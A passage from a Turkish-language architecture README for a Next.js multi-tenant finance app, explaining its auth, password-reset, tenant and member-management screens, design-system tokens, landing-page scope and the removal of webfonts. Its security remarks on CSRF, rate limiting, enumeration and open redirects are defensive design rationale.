- **Kapsam dışı:** Limiter process-local'dir; çok instance'lı bir deployment'ta her instance kendi
  sayacını tutar. Distributed rate limiting (Redis vb.) bu issue'nun kapsamı dışındadır —
  `RateLimiter` interface'i (`src/lib/rate-limit/types.ts`) tam da bu yüzden vardır: route
  kodu hiç değişmeden `src/lib/rate-limit/limiter.ts`'teki tek satır shared-store bir
  implementasyonla değiştirilebilir.

## Auth Ekranları (Issue #36)

İlk gerçek arayüz ekranları: `/login` ve `/signup` (`src/app/login`, `src/app/signup`;
paylaşılan sunum bileşenleri `src/components/auth-form.tsx`). Mock veri yoktur — formlar
mevcut API'lere gerçek HTTP istekleri atar.

### ⚠️ Neden client component, neden Server Action DEĞİL

Bu bir stil tercihi değil, **güvenlik gereğidir**:

`next-auth`'un **sunucu tarafı** `signIn()`'i (`node_modules/next-auth/lib/actions.js`)
bellekte bir `Request` nesnesi üretip `Auth()`'u **doğrudan** çağırır ve üstelik
`skipCSRFCheck` geçer. Yani istek hiçbir zaman HTTP üzerinden gitmez ve
`src/app/api/auth/[...nextauth]/route.ts` **çalışmaz** — oysa sign-in rate limitinin
(Issue #27) uygulandığı tek yer orasıdır. Bir Server Action'a geçmek, brute-force korumasını
ve Auth.js'in kendi CSRF kontrolünü **sessizce** devre dışı bırakırdı.

**İstemci tarafı** `signIn()` ise önce CSRF token'ı alır, sonra
`/api/auth/callback/credentials`'a gerçek bir HTTP POST atar — mevcut route'tan, dolayısıyla
rate limitten geçer. Aynı gerekçe signup için de geçerlidir: sayfa `registerUser()`'ı doğrudan
çağırmaz, `POST /api/auth/signup`'a istek atar.

Bu invariant `integration/auth-ui-pattern.spec.ts` ile otomatik olarak korunur.

### Diğer notlar

- **Hata mesajları Türkçedir ve status koduna göre eşlenir**; backend'in İngilizce iç metinleri
  (`"Password must be between 8 and 128 characters"`) kullanıcıya olduğu gibi gösterilmez.
- **Giriş hatası tek ve geneldir** ("E-posta veya şifre hatalı") — kayıtlı/kayıtsız e-posta
  ayrımı yapılmaz (user enumeration engeli). Signup'ta `409` ise açık bir mesaj gösterir; bu,
  Issue #106'da kayda geçmiş bilinçli kararın arayüze yansımasıdır.
- **429 ve ağ hatası aynı mesaja düşer.** İstemci `signIn()`, gövdesinde `url` alanı olmayan
  yanıtlarda (bizim 429 gövdemiz gibi) `new URL(undefined)` çağırıp **TypeError fırlatır** —
  hata döndürmez. Bu yüzden çağrı `try/catch` içindedir; blok kaldırılırsa rate limit'e takılan
  kullanıcı boş ekranla kalır.
- Başarılı kayıt sonrası otomatik giriş yapılmaz; kullanıcı `/login`'e yönlendirilir.
- Giriş sonrası `/dashboard`'a yönlendirilir (korumalı kabuk, Issue #39; bkz. aşağıdaki
  "Korumalı Kabuk" bölümü).

### Şifre sıfırlama ekranları (Issue #37)

`/forgot-password` ve `/reset-password?token=...`.

- **Genel mesaj arayüzde de korunur:** `/forgot-password`, e-posta kayıtlı olsun ya da
  olmasın **birebir aynı** mesajı gösterir. Backend zaten aynı 200'ü döner; arayüzün bunu
  "e-posta bulunamadı" gibi bir varyasyona çevirmesi, backend'de kapatılmış sızıntıyı UI
  katmanında yeniden açardı. Bu yüzden başarı durumunda status'a göre dallanma yapılmaz.
- **Token hataları ayrıştırılmaz:** "bulunamadı / süresi dolmuş / zaten kullanılmış" hepsi
  aynı mesaja düşer (backend duruşuyla aynı).
- **`/reset-password` bir sunucu bileşenidir**, form ise ayrı bir client component. Token'ı
  client'ta `useSearchParams()` ile okumak sayfayı bir `<Suspense>` sınırıyla sarmayı
  gerektirirdi; `searchParams`'ı sunucuda çözmek bu tuzağı tamamen ortadan kaldırır.
  (Next.js 16'da `searchParams` bir `Promise`'tir ve `await` edilir.)
- **URL'de token yoksa** form hiç render edilmez; kullanıcı doğrudan yeni bağlantı istemeye
  yönlendirilir — kesin başarısız olacak bir istek atılmaz.
- Token'ın prop olarak client'a geçmesi ek sızıntı değildir (değer zaten adres çubuğundadır);
  `Referrer-Policy: strict-origin-when-cross-origin` Referer üzerinden dışarı gitmesini
  engeller.

### `allowedDevOrigins` neden gerekli

`next dev`, dev-only varlıklara (`/_next/static/*`, HMR) yapılan cross-origin istekleri
varsayılan olarak engeller ve sunucu `localhost` ile başlatıldığından `127.0.0.1` farklı bir
origin sayılır. Playwright ise `baseURL` olarak `http://127.0.0.1:3000` kullanır — bu yüzden
tarayıcı testlerinde JS chunk'ları `403` alıyor, sayfa **hydrate olmuyor** ve client
component'lerdeki form handler'ları hiç çalışmıyordu (form native GET'e düşüp şifreyi URL'e
yazıyordu). Bu mismatch baştan beri vardı; client-side JS'e ihtiyaç duyan ilk ekranlar
eklenene kadar görünmedi. `next.config.ts`'teki `allowedDevOrigins` yalnızca development'ı
etkiler, production build'de karşılığı yoktur.

## Tasarım Sistemi

Arayüz tek bir görsel dile bağlıdır ve o dilin kaynağı `src/app/globals.css`'tir. Sayfalar ham
renk yazmaz; `bg-surface`, `text-muted`, `bg-brand-600`, `rounded-card` gibi token'ları
kullanır. Amaç, "her ekranda biraz farklı bir gri" hâline gelen dağılmayı baştan imkânsız
kılmak.

### İki katmanlı token yapısı

Ayrımı korumak önemli, çünkü koyu tema desteğinin tamamı buna dayanıyor:

1. **Marka rampaları** (`@theme`) — temadan BAĞIMSIZ. `brand-500` açık temada da koyu temada da
   aynı mavidir; değişen, onu hangi zeminde kullandığımızdır.
2. **Semantik yüzeyler** (`:root` + `@theme inline`) — temaya göre DEĞİŞİR. `surface`, `line`,
   `muted` gibi isimler "hangi renk" değil "ne işe yarıyor" der. Koyu tema yalnızca bu
   değişkenleri yeniden tanımlar; **hiçbir bileşen değişmez**.

Bu yüzden koyu temada tek tek `dark:` sınıfı yazmak gerekmiyor — yalnızca marka rampalarının
tonunu değiştirmek gerektiğinde (`dark:bg-brand-950` gibi) kullanılıyor.

### Palet

| Rol | Aile | Nerede |
| --- | --- | --- |
| Birincil eylem | `brand` — doygun, indigoya kaçık mavi | CTA, aktif menü, odak halkası, ikon kapları |
| Olumlu / gelir | `mint` — yeşil, mint tarafına çekilmiş | gelir tutarları, "gelir" etiketi, güven vurguları |
| İkincil accent | `iris` — yumuşak menekşe | yalnızca dekoratif katmanlar ve kategori etiketleri |
| Metin ve koyu yüzey | `ink` — nötr griden bilerek biraz mavi | metin, sidebar, hero güven paneli |
| Uyarı | `danger` — bilerek AZ doygun kırmızı | silme eylemleri, form hataları |

**Kırmızı bilerek soluk:** finans tablolarında her gider satırını alarma çeviren bir kırmızı,
gerçek hataları görünmez kılar. Gider tutarları bu yüzden kırmızı DEĞİL, nötr güçlü metin
rengindedir; yönü işaret (`+`/`-`) taşır.

### Gradyan bütçesi

Gradyan yasak değil ama **sayılıdır** ve yalnızca dört yerde kullanılıyor: marka işareti, hero
başlığındaki tek kelime, hero/kapanış bölümlerinin ışık lekeleri ve ürün önizlemesinin arka
katmanı. Kartlara, düğmelere ve bölüm zeminlerine gradyan verilmedi — her yüzey gradyanlı
olduğunda hiçbiri vurgu olmaz.

### Radius hiyerarşisi

Her şey `rounded-3xl` değil; yarıçap öğenin BOYUTUYLA artar:
`badge` (0.375rem) → `control` (0.5rem) → `card` (0.75rem) → `panel` (1rem) →
`showcase` (1.25rem). Bir badge ile bir panel aynı yarıçapı paylaşırsa ikisi de aynı boyutta
hissettirir ve hiyerarşi kaybolur.

### Odak halkası tek yerde

`globals.css`'teki `:focus-visible` kuralı TÜM etkileşimli öğeleri kapsar. Her bileşende ayrı
`focus-visible:` sınıfları yazmak, biri unutulduğunda klavye kullanıcısının o öğeyi kaybetmesi
demekti. Aynı dosyada `prefers-reduced-motion` de global olarak karşılanır.

### Paylaşılan bileşenler

`src/components/ui/` altında ve hepsi SAF SUNUM — veri okumaz, oturum bilmez:

- `icons.tsx` — tek ikon ailesi (24 birim, 1.75 çizgi). **Emoji kullanılmaz:** platformdan
  platforma değişir, renk sistemine uymaz, ekran okuyucuda gürültü üretir. İkon kütüphanesi de
  eklenmedi (CLAUDE.md §4).
- `money.tsx` — para gösterimi. **Değer hiç sayıya çevrilmez** (invariant #10): `Money` yalnızca
  tipografik hiyerarşi kurar (`tabular-nums`, işaret, soluk para birimi). İşaret TUTARDAN değil
  işlemin yönünden gelir, çünkü `Transaction.amount` daima pozitiftir (#53).
- `badge.tsx` — etiketler. `CategoryBadge` tonu adın **hash**'inden türetir: aynı kategori her
  ekranda aynı rengi alır. Rastgele ya da dizideki sıraya göre atama bu garantiyi vermezdi ve
  renk bir bilgi değil gürültü olurdu. "Kategorisiz" renkli ton ALMAZ — o bir kategori değil,
  kategorinin yokluğudur.
- `table.tsx` — tablo iskeleti. `TableScroll` olmadan geniş bir tablo SAYFANIN kendisini yatay
  kaydırılır hâle getirir ve tüm düzen bozulur; kaydırma tablonun kutusunda kalmalı.
- `empty-state.tsx` — boş durumlar. "Kayıt yok" yazıp bırakmak kullanıcıyı çıkmazda bırakır;
  desen üç şeyi birlikte verir: görsel çapa, ne olduğunu söyleyen cümle ve **mümkünse** bir
  eylem. Eylem opsiyoneldir çünkü yetkisi olmayan bir kullanıcıya "ilkini oluştur" demek, kesin
  `403` alacağı bir yola davet etmek olurdu.
- `surfaces.tsx` — `PageHeader`, `Panel`, `PanelHeader`, `IconTile`. `Panel`'in `tone`'u
  dekorasyon değil HİYERARŞİ aracıdır: bir ekrandaki bütün kartlar aynı beyaz kutu olduğunda
  hiçbiri öne çıkmaz. `accent` en fazla bir kart için.
- `brand-mark.tsx` — marka işareti. Gerçek bir logo geldiğinde dokunulacak tek yer.

`FIELD_CLASS` / `LABEL_CLASS` (`auth-form.tsx`) dışa açıktır: uygulamada `select` alanları da
var ve onlar `TextField`'ı kullanamaz. Sınıf dizisi her formda elle tekrarlandığında kaçınılmaz
olarak ayrışıyordu — bir ekranda kenarlık başka tonda, diğerinde odak rengi yok.

### Kabuk: sidebar

Uygulama kabuğu üst navigasyondan **sidebar**'a geçti (`app-sidebar.tsx`). Kararlar:

- **Tek bir `<nav aria-label="Ana menü">` var.** Masaüstü ve mobil için iki ayrı nav render
  etmek, erişilebilirlik ağacında aynı isimde iki navigasyon bırakır ve ekran okuyucuya aynı
  menüyü iki kez okur. Aynı DOM düğümü CSS ile yer değiştiriyor: mobilde ekran dışından kayan
  bir panel, `lg` üstünde sabit bir kolon.
- **Sidebar bir `<header>`dir** (`banner` rolü), `<aside>` değil: marka ve birincil
  navigasyonu barındıran bölge tanımı gereği banner'dır.
- **Aktif öğe ÜÇ kanaldan belli olur** — dolgulu zemin, marka renginde ikon ve sol kenarda ince
  şerit — artı `aria-current="page"`. Tek kanal (yalnızca renk) renk körlüğünde kaybolurdu.
- **Menü iki gruba ayrıldı** ("Finans", "Yönetim"): sekiz öğelik düz bir liste, hangisinin para
  hareketiyle hangisinin yönetimle ilgili olduğunu söylemiyordu.
- Mobil üst çubuk `fixed`tir; telafi boşluğu **içerik kabına** verilir. Sidebar'ın yanına boş
  bir `div` koymak denendi ve çalışmadı — kabuk bir flex SATIRI olduğu için o div dikey değil
  yatay yer kaplıyordu.

Sidebar sola taşındığı için ekranlardaki "Önce **üstteki** menüden bir çalışma alanı seçin"
kopyası yanlış hâle geldi ve yön belirtmeyen bir cümleye çevrildi; ilgili E2E testleri de
güncellendi.

### Auth ekranları: split layout

`AuthCard` iki kolonlu: solda koyu marka paneli (ürünün GERÇEK yetenekleri), sağda yalnızca
form. Beyaz bir zeminde ortada duran bir form, kullanıcının açılış sayfasından getirdiği
bağlamı koparıyordu.

**Mobilde sol panel hiç render EDİLMEZ** (`hidden lg:flex`) — DOM'da duran gizli bir dekorasyon
değil. Küçük ekranda tek iş formu doldurmaktır ve kaydırılacak bir tanıtım paneli o işin önüne
geçerdi. Kullanılabilirlik görselliğin önünde.

### Panel (`/dashboard`) ve kapsam sınırı

> **Güncelleme (#62/#63):** bu bölümün "özet ve grafik bilerek yok" kararı **artık geçerli
> değil** — özet servisi ve grafik eklendi. Yerini alan kararlar için aşağıdaki
> "[Panel özeti, grafik ve onboarding](#panel-özeti-grafik-ve-onboarding-issue-62-63)"
> bölümüne bakın. Aşağıdaki kısıtın *nedeni* ise hâlâ geçerlidir ve o bölümde korunmuştur:
> **farklı para birimleri toplanmaz.**

Panelin ilk hâli (#39) aktif çalışma alanının **hesap kartlarını** ve **son beş hareketini**
gösteriyordu; hepsi mevcut servis fonksiyonlarından okunuyordu (`listAccounts`,
`listTransactions`, `listCategories`) — yeni bir API, servis ya da sorgu eklenmemişti.

O aşamada "toplam bakiye", "bu ayın geliri/gideri" gibi özetler **bilerek yoktu:**

1. Hesaplar farklı para birimlerinde olabilir; bunları toplamak anlamsız bir sayı üretirdi.
2. Dönemsel toplamlar para aritmetiği demektir ve bu, sunum katmanına değil `src/lib/finance`
   içine ait bir iş kuralıdır (Epic 7 / #62'nin konusu).

İkinci gerekçe bir *yasak* değil, bir *sıra* kararıydı: #62 o iş kuralını `src/lib/finance`
içine yazdı, panel de oradan okuyor. Birinci gerekçe ise olduğu gibi duruyor.

### Tipografi: webfont yok, native yığın

`--font-sans` bir **native sistem yığınıdır**; hiçbir webfont indirilmez. #131/#142'nin kararı
(bkz. "Fontlar: webfont yok") burada **korunuyor** — `next/font/google` build zamanında Google'a
çıkan bir bağımlılıktı ve geri getirilmemelidir.

Değişen tek şey yığının SIRASI: #142 onu `Arial` ile başlatmıştı, bu tasarım sistemi
`-apple-system` / `Segoe UI` / `Roboto` ile başlatıyor. Çelişki değil, o kararın kendi
"sonraki adım" notunun uygulanması: #142 Arial'ı bilerek seçti çünkü o issue bir **bağımlılık
temizliğiydi** ve "görünüm değişmesin" kısıtı vardı; kendi notu da native yığını ayrı bir
görünüm kararı olarak işaretliyordu. Bu tasarım sistemi tam olarak o karardır. `Arial` yığında
son çare olarak duruyor.

Başlıklarda `tracking-tight` + `text-balance`, gövde metinlerinde `text-pretty`; finansal
değerlerde `tabular-nums` (rakamlar eşit genişlikte basılır, kolonlar birbirini hizalar).

**Bilinen sınır:** marka fontu hâlâ yok. İstenirse `next/font/local` + repoya alınmış woff2 ile
eklenmeli — `next/font/google`a dönmek build'in ağ bağımlılığını geri getirir.

## Public Açılış Sayfası (`/`)

`/` artık public bir ürün açılış sayfasıdır (`src/app/page.tsx`). Öncesinde
**"Proje altyapısı başarıyla çalışıyor."** yazan bir geliştirme ekranıydı; ürünün ana adresi,
ziyaretçiye ürünü değil kurulum durumunu gösteriyordu.

### Route ayrımı yapısaldır, koşullu değil

Açılış sayfası root layout'un altındadır, `src/app/(app)/` altında **değil**. Uygulama kabuğu
(header + "Ana menü" navigasyonu) yalnızca o route group'un layout'undadır, dolayısıyla `/`'de
**hiç render edilmez** — "kabuğu gizle" diye bir koşul yazmaya gerek yoktur. Aynı ayrım
`/login`, `/signup`, `/forgot-password`, `/reset-password` için de geçerlidir; yani public alan
ile uygulama alanı arasındaki görsel sınır, dosya konumunun doğal sonucudur.

Bu yapının bozulması (ör. sayfanın `(app)` altına taşınması) `e2e/landing.spec.ts` ile
yakalanır: kabuğun navigasyonunun `/`'de bulunmadığı, `/dashboard`'da bulunduğu ayrı ayrı
doğrulanır.

### Oturum OKUNUR, yönlendirme YAPILMAZ

Sayfa `getCurrentUser()` kullanır, `requirePageUser()` **değil**. İkincisi oturum yoksa
`/login`'e yönlendirir; bu sayfanın işi ise tam tersidir — oturumsuz ziyaretçiye ürünü anlatmak.

Oturum varsa **yalnızca header'daki eylem değişir** ("Giriş Yap / Kayıt Ol" yerine
"Panele Git"); kullanıcı `/dashboard`'a **zorla atılmaz**. Gerekçe: giriş yapmış birinin ana
sayfayı görmek istemesi meşrudur (paylaşılan bir link, yer imi, ürünü birine gösterme). Zorunlu
yönlendirme, o ziyaretçiyi kendi ürününün tanıtım sayfasından dışlardı.

Bu bir yetkilendirme kararı **değildir**: header'da "Panele Git" göstermek bir kolaylıktır,
`/dashboard` kendi `requirePageUser()` guard'ını her hâlükârda çalıştırır.

**Maliyet notu:** oturum cookie'si okunduğu için sayfa dinamiktir, ama oturumsuz ziyaretçide
DB'ye gitmez — cookie yoksa Auth.js JWT'yi hiç çözmez, dolayısıyla `callbacks.jwt` içindeki
session-revocation sorgusu da çalışmaz.

### Yalnızca ÜRÜNDE VAR OLAN özellikler anlatılır

Açılış sayfasındaki beş maddenin her birinin arkasında çalışan bir ekran ve API vardır: gelir/
gider takibi (#54, #56, #135), hesaplar ve bakiyeler (#47), kategoriler (#50), çoklu çalışma
alanı (#40, #42), ekip ve roller (#43).

**Kasıtlı olarak anılmayanlar:** finansal rapor/analiz (#64–#67), bildirimler, içe/dışa
aktarma, fatura ve borç/alacak takibi. Hepsi backlog'dadır. Bir açılış sayfasını doldurmak için
verilen söz, ürünün kendisinden önce güveni tüketir.

**Not (#62/#63):** panel artık özet ve grafik gösteriyor, ama açılış sayfasının metni
**bilerek değiştirilmedi**. "Grafik" kelimesini pazarlama metnine koymak ayrı bir karardır ve
`e2e/landing.spec.ts`'teki "yok" iddiasını gevşetmeyi gerektirir; panel içi bir özet, henüz
"raporlama" diye satılabilecek bir yetenek değildir (asıl rapor ekranları #65–#67).

Bu, yorum olarak bırakılmamış: `e2e/landing.spec.ts` sayfa metninde "Rapor", "Grafik", "Fatura",
"Dışa aktar", "İçe aktar", "Bildirim" geçmediğini doğrular. Biri bu özelliklerden birini
gerçekten eklediğinde testi güncellemek, o an bilinçli bir karar olur.

Aynı spec, **geliştirme/altyapı çıktısının** ("Proje altyapısı", health, JSON, `localhost:3000`)
sayfada bulunmadığını da doğrular — düzeltilen hatanın tam olarak bu olduğu düşünülürse
regresyonu ucuza sabitlemek doğruydu. Her iki "yok" iddiası da bir duyarlılık kontrolüyle
birlikte gelir (sayfa boş olsaydı da geçerlerdi).

### Görsel kararlar

- **Sahte ürün ekran görüntüsü YOK.** Hero'da soyut, `aria-hidden` bir zemin gradyanı var;
  uydurma bir arayüz görseli, henüz var olmayan ekranları varmış gibi gösterirdi.
- **Özellik kartları ayrı ayrı çerçevelenir**, bitişik (`gap-px`) bir ızgarada değil. Bitişik
  düzen daha "premium" duruyordu ama beş özellik üç sütuna bölündüğünde son satırda **boş bir
  hücre** bırakıyor ve sayfa yarım kalmış gibi görünüyordu. Mevcut düzen özellik sayısından
  bağımsız olarak bozulmaz.
- **Birincil eylem rengi `SubmitButton` ile aynıdır** (`zinc-900` / koyu temada `zinc-50`):
  aynı üründe iki farklı "birincil eylem" rengi olmamalı.
- **İkonlar inline SVG'dir**; bir ikon kütüphanesi eklenmedi (CLAUDE.md §4 "Ek kural").
- Sunum parçaları (`PrimaryLink`, `BrandMark`, ikonlar) `src/components/` altına **taşınmadı**:
  tek bir sayfa kullanıyor ve bu repo kullanılmayan soyutlama getirmiyor. İkinci bir public
  sayfa geldiğinde ortak olanlar taşınmalı.

### Bilinen sınır: ürün adı iki yerde farklı

Açılış sayfası **FinansMax** der, uygulama kabuğu ise hâlâ "Bireysel ve Kurumsal Finans".
Kabuktaki adı değiştirmek bu işin kapsamı değildi (ve `e2e/app-shell.spec.ts` o metne bakıyor);
ama ikisinin ayrışması kalıcı olmamalı — ürün adının nerede ne olacağı tek bir kararla
netleşmelidir.

## Korumalı Kabuk (Issue #39)

Giriş yapmış kullanıcının gördüğü alan `(app)` route group'unun altındadır
(`src/app/(app)/layout.tsx` + `src/app/(app)/dashboard/page.tsx`; sunum
`src/components/app-shell.tsx`). Parantezli klasör adı URL'e yansımaz — `/login`, `/signup`
gibi public ekranlar root layout'un altında kalır ve kabuğu hiç almaz.

### Oturum kontrolü neden layout'ta "da", sadece layout'ta değil

`requirePageUser()` (`src/lib/auth/page-guard.ts`) hem layout'ta hem de korunan **her sayfada**
çağrılır. Next.js'in kendi rehberi (`node_modules/next/dist/docs/01-app/02-guides/authentication.md`
→ "Layouts and auth checks") layout kontrolüne tek başına güvenmemeyi söyler:

- **Partial rendering** nedeniyle layout'lar istemci tarafı gezinmelerde yeniden render
  **edilmez** — oturum her rota değişiminde kontrol edilmiş olmaz.
- Bir layout, alt segmentlerin render edilmesini (ve RSC payload'ında görünmesini)
  **engellemez**; "layout'ta `return null`" bir yetkilendirme mekanizması değildir.

Bu yönlendirme zaten savunmanın son hattı değildir: veriye erişen her API route'u kendi
`requireUser()`/`requirePermission()` kontrolünü yapar. Sayfa guard'ı bir **UX** kararıdır.

`getCurrentUser()` JWT'yi çözerken session revocation için bir DB sorgusu tetiklediğinden
(bkz. `callbacks.jwt`), layout + sayfa aynı istekte iki sorgu yapmasın diye sonuç React'in
`cache()`'i ile paylaşılır.

### Kayda geçen kararlar

- **`?next=<yol>` (callbackUrl) parametresi YOKTUR.** Kullanıcı kontrolündeki bir hedefi
  yönlendirmede kullanmak, doğrulaması unutulduğu anda **open redirect**'e dönüşen bir
  yüzeydir. "Giriş sonrası geldiği sayfaya dön" davranışı bu issue'nun kapsamında değildi;
  eklenirse yalnızca `/` ile başlayan (ve `//` ile başlamayan) yollar kabul edilmelidir.
- **Kabukta e-posta gösterilir, `session.user.name` değil.** Gerekçe #113'te ORTADAN KALKTI:
  JWT'deki `name` artık her istekte tazeleniyor (bkz. "JWT'deki ad profil güncellemesiyle
  senkron"). Kabuğu ada geçirmek yine de ayrı bir karardır — adı olmayan kullanıcı için ne
  gösterileceği bir tasarım sorusudur ve #113'ün kapsamında değildi.
- **Çıkış düğmesi istemci tarafı `signOut()` kullanır** (login/signup ile aynı gerekçe: sunucu
  tarafı `signOut()` `Auth()`'u doğrudan çağırıp `skipCSRFCheck` geçer, HTTP route'u hiç
  çalışmaz). Ayrıca `callbackUrl` ile **tam sayfa** yönlendirme yapılır: yumuşak bir gezinme,
  Next.js'in istemci router cache'indeki korumalı sayfaları ekranda bırakabilirdi. Regresyon
  koruması: `integration/auth-ui-pattern.spec.ts`.
- **Henüz var olmayan menü öğeleri link değildir** (`NAV_ITEMS` içinde `href: null`), devre dışı
  metin olarak render edilir — link olsalardı kullanıcıyı 404'e götürürlerdi.

E2E kanıtı: `e2e/app-shell.spec.ts` (oturumsuz erişimde yönlendirme + kabuğun hiç render
edilmemesi, oturumlu erişimde kabuk, çıkış sonrası oturumun gerçekten kapanması).

### Tenant switcher (Issue #40)

Kabuk header'ındaki çalışma alanı seçici (`src/components/tenant-switcher.tsx`). Seçenekler
**sunucuda**, oturum sahibinin membership'lerinden üretilir (`listTenantsForUser()`); seçim
mevcut `POST /api/tenants/active` endpoint'ine gider.

- **"Üyesi olmadığı tenant seçilemez" garantisi arayüzden gelmez.** Liste kullanıcıya yalnızca
  kendi tenant'larını gösterir, ama asıl kontrol backend'dedir: endpoint, membership'i her
  istekte DB'den doğrular ve üye değilse **403** döner ("tenant yok" ile "üye değilsin" aynı
  yanıta düşer — enumeration engeli). E2E, seçiciyi baypas edip doğrudan istek atarak bunu
  kanıtlar.
- **Aktif tenant otomatik SEÇİLMEZ.** Sayfa render'ı bir `GET`'tir; orada cookie yazmak
  "GET yan etkisizdir" invariant'ını (CSRF duruşunun dayanağı) ihlal ederdi. Aktif tenant yokken
  seçici bir placeholder gösterir ve seçimi kullanıcı yapar.
- **Başarılı geçişte tam sayfa yükleme yapılır, `router.refresh()` değil.** `refresh()` istemci
  cache'ini yalnızca **mevcut** route için temizler (Next.js `useRouter` dokümanı); çok kiracılı
  bir üründe diğer route'ların cache'inde eski tenant'ın verisi kalır ve kullanıcı oraya
  geçtiğinde yanlış çalışma alanının verisini görürdü.
- **Hata mesajı ayrıştırılmaz:** 403/404/ağ hatası tek bir Türkçe mesaja düşer; başarısız
  seçimde kutu sunucudan gelen gerçek duruma geri alınır.
- `resolveActiveTenantForUser()` (`src/lib/tenants/tenant-context.ts`), kullanıcı zaten
  elimizdeyken oturumu **yeniden çözmeden** aktif tenant'ı okur — `getActiveTenant()` aynı
  istekte ikinci bir session-revocation DB sorgusu tetiklerdi.

E2E kanıtı: `e2e/tenant-switcher.spec.ts`. Geçişin gerçekten sunucu tarafında olduğu, seçici
kutusundaki değere değil, aktif tenant'a bağlı gerçek bir endpoint'e bakılarak doğrulanır
(aktif tenant A iken A→200 / B→403, geçişten sonra tersi; hiç seçim yokken 400).

### Çalışma alanı oluşturma ekranı (Issue #42)

`/tenants/new` (`src/app/(app)/tenants/new/`). Kabuk menüsündeki "Yeni Çalışma Alanı"
bağlantısından erişilir; oluşturan kullanıcı OWNER olur (`createTenant()`).

- **Servis doğrudan çağrılmaz, `POST /api/tenants`'a HTTP isteği atılır.** Tenant oluşturma
  rate limiti (Issue #27) route seviyesindedir; `createTenant()`'ı bir Server Action'dan
  çağırmak otomatik tenant üretimine karşı korumayı sessizce baypas ederdi. Regresyon koruması:
  `integration/auth-ui-pattern.spec.ts` (auth ekranlarıyla aynı tabloya eklendi).
- **`409` (kullanılan adres) açık bir mesaj gösterir.** Bu, auth ekranlarındaki enumeration
  duruşuyla çelişmez: orada gizlenen şey bir **hesabın** varlığıydı; slug ise global ve
  kullanıcıya görünür bir adres parçasıdır, "bu ad alınmış" bilgisi zaten adresin kendisinden
  öğrenilir.
- **Boş adres alanı gönderilmez** (`undefined` ile alan tamamen düşer): backend slug'ı isimden
  türetir. Boş string göndermek "geçersiz slug" dalını tetiklerdi.
- **Yeni tenant otomatik olarak aktif yapılmaz.** Aktif tenant seçimi kullanıcının açık
  eylemidir (seçici, Issue #40); oluşturmanın ardından sessizce ikinci bir state değişikliği
  yapmak, başarısız olması hâlinde açıklaması zor bir yarı-durum bırakırdı.
- `src/components/auth-form.tsx`'teki `TextField` bu ekran için `type="text"`, opsiyonel alan
  (`required={false}`) ve açıklama (`hint`, `aria-describedby` ile bağlanır) destekleyecek
  şekilde genişletildi; auth ekranlarının davranışı değişmedi (varsayılanlar korundu).

E2E kanıtı: `e2e/tenant-create-ui.spec.ts`. Sonuç formun yönlendirmesine değil, bağımsız bir
okuma yoluna (`GET /api/tenants`) bakılarak doğrulanır: kayıt gerçekten oluştu mu, rol OWNER mı,
hata durumunda ikinci kayıt oluşmadı mı.

### Üye yönetimi ekranı (Issue #43)

`/members` (`src/app/(app)/members/`). Aktif çalışma alanının üyelerini listeler; yetkili
rollere rol değiştirme ve üyeyi çıkarma aksiyonlarını gösterir.

- **URL'de `tenantId` yoktur.** Hangi tenant'ın üyeleri gösterileceğinin tek kaynağı aktif
  tenant'tır (Issue #10 cookie'si, membership'i her istekte DB'den doğrulanır). URL'e tenantId
  koymak "adres çubuğunu değiştirip başka tenant'ı görme" denemelerine yüzey açardı; backend
  bunu zaten 403'le reddeder (`requirePermission()` → `expectedTenantId`), ama parametreyi hiç
  sunmamak daha temizdir.
- **Issue metninden bilinçli sapma.** #43'ün kabul kriteri "OWNER olmayan kullanıcı bu ekrana
  erişemiyor" der; ancak o metin izin matrisinden (#11/#12) öncedir ve **matris yetkili
  kaynaktır**: `MEMBER` rolü `VIEW_MEMBERS` iznine sahiptir. Bu yüzden ekran listeyi tüm
  üyelere gösterir, yönetim aksiyonlarını yalnızca `UPDATE_MEMBER_ROLE` / `REMOVE_MEMBER`
  iznine sahip role render eder. Matrisi gevşetmek yerine matrisi uygulamak tercih edildi.
- **UI'daki "devre dışı" kuralları güvenlik kontrolü değildir.** ADMIN'in bir OWNER'a
  dokunamaması, son OWNER'ın düşürülememesi/çıkarılamaması ve rol izinleri backend'de
  (`src/lib/tenants/membership.ts` + `src/lib/authz/`) Serializable transaction içinde
  zorlanır. Arayüzdeki kilitler yalnızca kesin başarısız olacak bir işlemi kullanıcıya
  denetmemek içindir; kaldırılsalar güvenlik değişmez (kanıt:
  `security/tenant-membership-authorization-security.spec.ts`).
- **Native `confirm()` yerine satır içi onay.** Tarayıcı diyaloğu sayfa akışını bloke eder,
  ekran okuyucularda ve testlerde daha kırılgandır.
- **Aksiyon sonrası `router.refresh()` yeterlidir** (tenant switcher'daki tam sayfa
  yüklemesinden farklı olarak): aktif tenant değişmiyor, yalnızca bu route'un verisi
  değişiyor.
- Prisma Client istemci paketine girmesin diye `MembershipRole` client bileşenine **yalnızca
  `type` olarak** import edilir; rol listesi string literal olarak yazılıp `satisfies` ile
  tipe bağlanır.

E2E kanıtı: `e2e/tenant-members-ui.spec.ts`. Her sonuç `GET /api/tenants/:id/members` ile
doğrulanır; ayrıca **duyarlılık kanıtı** olarak arayüz baypas edilip endpoint doğrudan çağrılır
(son OWNER → 409, MEMBER'ın rol değiştirme denemesi → 403).

## Fontlar: webfont yok (Issue #131)

Uygulama **hiçbir webfont yüklemez**; font yığını `src/app/globals.css`'te açık olarak
yazılıdır. Bu, `create-next-app` iskeletinden gelen `next/font/google` (`Geist`,
`Geist Mono`) kullanımının kaldırılmasıyla oluştu.

### Neden kaldırıldı: iki maliyet, sıfır fayda

**1. Build ağa çıkıyordu.** `next/font/google` fontu **build sırasında** Google'ın
sunucularından indirir. Erişimin kesildiği bir anda deploy hattı, uygulamada hiçbir şey
değişmemişken kırılır (bir kez gözlendi: `Error: next/font: error:`). Ağı olmayan bir ortamda
proje hiç build edilemez. Bu, repo'nun geri kalanındaki duruşla da çelişiyordu — `CLAUDE.md`
§4 dış bağımlılığa mesafeli, ama build zamanında sessiz bir tanesi vardı.

**2. Font indiriliyordu ama HİÇ render edilmiyordu.** Kaldırmadan önce tarayıcıda ölçüldü:

| | Öncesi | Sonrası |
| --- | --- | --- |
| `html` computed font | `Geist, "Geist Fallback"` | `Arial, Helvetica, sans-serif` |
| `body` / `h1` / `label` / `button` | `Arial, Helvetica, sans-serif` | `Arial, Helvetica, sans-serif` |
| İndirilen woff2 sayısı | **2** | **0** |

Sebep: `globals.css` `body`'ye `Arial` yazıyordu ve görünen her şey `body` içindedir; ayrıca
`src/` genelinde tek bir `font-sans`/`font-mono` kullanımı yoktu. Geist yalnızca `<html>`de
